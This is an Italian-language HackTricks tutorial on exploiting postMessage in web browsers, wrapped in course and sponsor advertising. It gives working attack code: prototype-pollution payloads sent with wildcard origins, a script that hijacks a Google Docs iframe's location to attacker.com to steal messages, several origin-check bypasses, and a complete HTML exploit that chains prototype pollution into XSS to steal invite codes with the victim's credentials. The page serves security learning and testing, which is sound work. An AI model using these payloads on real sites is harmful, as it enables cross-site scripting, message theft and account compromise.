# Vulnerabilit√† di PostMessage

## Vulnerabilit√† di PostMessage

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) √® un motore di ricerca alimentato dal **dark web** che offre funzionalit√† **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.

Il loro obiettivo principale √® contrastare le violazioni degli account e gli attacchi ransomware derivanti da malware che rubano informazioni.

Puoi visitare il loro sito web e provare il loro motore **gratuitamente** su:

{% embed url="https://whiteintel.io" %}

***

## Invia **PostMessage**

**PostMessage** utilizza la seguente funzione per inviare un messaggio:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Si noti che **targetOrigin** pu√≤ essere un '\*' oppure un URL come _https://azienda.com._\
Nel **secondo scenario**, il **messaggio pu√≤ essere inviato solo a quel dominio** (anche se l'origine dell'oggetto finestra √® diversa).\
Se viene utilizzato il **jolly**, i **messaggi potrebbero essere inviati a qualsiasi dominio**, e saranno inviati all'origine dell'oggetto Finestra.

### Attaccare iframe e jolly in **targetOrigin**

Come spiegato in [**questo rapporto**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) se trovi una pagina che pu√≤ essere **inserita in un iframe** (senza protezione `X-Frame-Header`) e che sta **inviando messaggi sensibili** tramite **postMessage** utilizzando un **jolly** (\*), puoi **modificare** l'**origine** dell'**iframe** e **rivelare** il **messaggio sensibile** a un dominio controllato da te.\
Si noti che se la pagina pu√≤ essere inserita in un iframe ma il **targetOrigin** √® **impostato su un URL e non su un jolly**, questo **trucco non funzioner√†**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Sfruttamento di addEventListener

**`addEventListener`** √® la funzione utilizzata da JS per dichiarare la funzione che si aspetta `postMessages`.\
Verr√† utilizzato un codice simile al seguente:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Nota in questo caso come la **prima cosa** che il codice fa √® **controllare l'origine**. Questo √® estremamente **importante** soprattutto se la pagina sta per fare **qualcosa di sensibile** con le informazioni ricevute (come cambiare una password). **Se non controlla l'origine, gli attaccanti possono far inviare dati arbitrari a questi endpoint** e cambiare le password delle vittime (in questo esempio).

### Enumerazione

Per **trovare gli event listener** nella pagina corrente puoi:

* **Cercare** nel codice JS per `window.addEventListener` e `$(window).on` (versione _JQuery_)
* **Eseguire** nella console degli strumenti per sviluppatori: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **Andare su** _Elementi --> Event Listeners_ negli strumenti per sviluppatori del browser

![](<../../.gitbook/assets/image (396).png>)

* Utilizzare un'estensione del browser come [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) o [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Queste estensioni del browser **intercetteranno tutti i messaggi** e te li mostreranno.

### Bypass degli origini

* L'attributo **`event.isTrusted`** √® considerato sicuro in quanto restituisce `True` solo per eventi generati da azioni autentiche dell'utente. Anche se √® difficile da aggirare se implementato correttamente, la sua importanza nei controlli di sicurezza √® notevole.
* L'uso di **`indexOf()`** per la validazione dell'origine negli eventi PostMessage potrebbe essere suscettibile di aggiramento. Un esempio che illustra questa vulnerabilit√† √®:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* Il metodo **`search()`** di `String.prototype.search()` √® destinato alle espressioni regolari, non alle stringhe. Passare qualsiasi cosa diversa da una regexp porta a una conversione implicita in regex, rendendo il metodo potenzialmente insicuro. Questo perch√© nelle regex, un punto (.) funziona come un carattere jolly, consentendo di aggirare la validazione con domini appositamente creati. Ad esempio:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* La funzione **`match()`**, simile a `search()`, elabora le regex. Se la regex √® strutturata in modo non corretto, potrebbe essere vulnerabile all'aggiramento.
* La funzione **`escapeHtml`** √® destinata a sanificare gli input mediante l'escape dei caratteri. Tuttavia, non crea un nuovo oggetto con caratteri di escape ma sovrascrive le propriet√† dell'oggetto esistente. Questo comportamento pu√≤ essere sfruttato. In particolare, se un oggetto pu√≤ essere manipolato in modo che la sua propriet√† controllata non riconosca `hasOwnProperty`, l'`escapeHtml` non funzioner√† come previsto. Questo √® dimostrato negli esempi seguenti:

* Fallimento previsto:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
* Aggirare l'escape:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

Nel contesto di questa vulnerabilit√†, l'oggetto `File` √® particolarmente sfruttabile a causa della sua propriet√† `name` in sola lettura. Questa propriet√†, quando utilizzata nei modelli, non viene sanificata dalla funzione `escapeHtml`, portando a potenziali rischi per la sicurezza.
* La propriet√† `document.domain` in JavaScript pu√≤ essere impostata da uno script per abbreviare il dominio, consentendo un'applicazione pi√π rilassata della stessa politica di origine all'interno dello stesso dominio principale.

### Bypass di e.origin == window.origin

Quando si incorpora una pagina web all'interno di un **iframe sandboxato** utilizzando %%%%%%, √® cruciale comprendere che l'origine dell'iframe sar√† impostata su null. Questo √® particolarmente importante quando si tratta di **attributi sandbox** e delle loro implicazioni sulla sicurezza e sulla funzionalit√†.

Specificando **`allow-popups`** nell'attributo sandbox, ogni finestra popup aperta dall'interno dell'iframe eredita le restrizioni del sandbox del genitore. Ci√≤ significa che a meno che non sia incluso anche l'attributo **`allow-popups-to-escape-sandbox`**, l'origine della finestra popup √® anch'essa impostata su `null`, allineandosi con l'origine dell'iframe.

Di conseguenza, quando viene aperta una popup in queste condizioni e viene inviato un messaggio dall'iframe alla popup utilizzando **`postMessage`**, sia l'origine di invio che di ricezione vengono impostate su `null`. Questa situazione porta a uno scenario in cui **`e.origin == window.origin`** si valuta come vero (`null == null`), poich√© sia l'iframe che la popup condividono lo stesso valore di origine `null`.

Per ulteriori informazioni **leggi**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Aggirare e.source

√à possibile verificare se il messaggio proviene dalla stessa finestra in cui lo script √® in ascolto (particolarmente interessante per **Content Scripts delle estensioni del browser** per verificare se il messaggio √® stato inviato dalla stessa pagina):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Puoi forzare **`e.source`** di un messaggio a essere nullo creando un **iframe** che **invia** il **postMessage** e viene **immediatamente eliminato**.

Per ulteriori informazioni **leggi:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypass dell'intestazione X-Frame

Per eseguire questi attacchi idealmente dovresti essere in grado di **inserire la pagina web della vittima** all'interno di un `iframe`. Tuttavia alcuni header come `X-Frame-Header` possono **prevenire** tale **comportamento**.\
In questi scenari puoi comunque utilizzare un attacco meno stealthy. Puoi aprire una nuova scheda all'applicazione web vulnerabile e comunicare con essa:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Rubare il messaggio inviato al figlio bloccando la pagina principale

Nella pagina seguente puoi vedere come potresti rubare dati sensibili inviati tramite **postmessage** a un **iframe figlio** bloccando la **pagina principale** prima di inviare i dati e sfruttando un **XSS nel figlio** per **rivelare i dati** prima che vengano ricevuti:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Rubare il messaggio modificando la posizione dell'iframe

Se puoi inserire un iframe in una pagina web senza l'header X-Frame che contiene un altro iframe, puoi **modificare la posizione di quell'iframe figlio**, quindi se sta ricevendo un **postmessage** inviato utilizzando un **jolly**, un attaccante potrebbe **modificare** l'**origine** di quell'iframe a una pagina **controllata** da lui e **rubare** il messaggio:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage a Prototype Pollution e/o XSS

Nei casi in cui i dati inviati tramite `postMessage` vengono eseguiti da JS, puoi **inserire un iframe** nella **pagina** ed **sfruttare** la **prototype pollution/XSS** inviando l'exploit tramite `postMessage`.

Un paio di **XSS molto ben spiegati tramite `postMessage`** possono essere trovati in [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Esempio di un exploit per abusare della **Prototype Pollution e poi XSS** tramite un `postMessage` a un `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Per **ulteriori informazioni**:

* Link alla pagina su [**inquinamento del prototipo**](../deserialization/nodejs-proto-prototype-pollution/)
* Link alla pagina su [**XSS**](../xss-cross-site-scripting/)
* Link alla pagina su [**inquinamento del prototipo lato client a XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Riferimenti

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Per praticare: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) √® un motore di ricerca alimentato dal **dark web** che offre funzionalit√† **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware stealer**.

Il loro obiettivo principale √® combattere i takeover degli account e gli attacchi ransomware derivanti da malware che rubano informazioni.

Puoi visitare il loro sito web e provare il loro motore **gratuitamente** su:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.

</details>
